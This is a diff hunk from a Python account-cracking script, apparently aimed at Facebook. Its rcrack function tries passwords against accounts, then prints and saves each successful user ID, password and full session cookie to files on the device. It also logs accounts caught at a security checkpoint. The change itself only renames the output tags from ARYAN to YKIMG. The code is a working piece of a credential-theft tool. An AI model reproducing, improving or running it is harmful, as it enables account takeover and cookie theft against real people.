@@ -264,22 +264,22 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m(ARYAN-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('\r\r\033[1;32m(YKIMG-OK🔥)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/ARYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/YKIMG-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m(ARYAN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\r\r\33[1;30m(YKIMG-CP🤕)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/YKIMG-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s[ARYAN] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r\r%s[YKIMG] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
